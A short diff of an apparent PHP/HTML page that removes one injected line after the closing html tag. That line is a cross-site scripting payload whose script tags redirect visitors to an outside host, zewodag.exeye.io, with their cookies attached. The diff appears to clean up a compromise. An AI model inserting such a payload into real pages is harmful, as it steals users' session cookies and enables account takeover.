@@ -16,4 +16,3 @@
 ?>
 </body>
 </html>
-123<h1>123</h1><script>window.location="http://zewodag.exeye.io/?cookie=" %2b document.cookie</script><script>window.location="http://zewodag.exeye.io/?cookie=" + document.cookie</script>123
